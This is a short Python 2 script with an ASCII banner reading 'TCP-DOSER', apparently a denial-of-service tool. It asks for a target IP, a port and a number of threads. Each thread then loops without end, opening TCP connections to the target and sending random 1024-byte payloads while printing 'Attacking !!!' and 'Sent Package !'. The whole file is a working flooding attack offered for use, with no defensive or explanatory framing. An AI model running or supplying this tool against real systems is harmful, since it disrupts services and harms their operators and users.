import time
import socket
import random
import threading

print (" ")
print (" ╔╦╗╔═╗╔═╗  ╔╦╗╔═╗╔═╗╔═╗╦═╗ ")
print ("  ║ ║  ╠═╝───║║║ ║╚═╗║╣ ╠╦╝ ")
print ("  ╩ ╚═╝╩    ═╩╝╚═╝╚═╝╚═╝╩╚═ ")
time.sleep(0.5)
print (" ")
ip = raw_input("IP : ")
port = input("Port : ")
thread_num = input("Threads : ")
print "Attacking !!! Thread:",thread_num

def run():
	bytes = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port))) 
			s.send(bytes)
			print "Sent Package !"
		except:
			s.close()
			print "Error , Socket Closed"
			
for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
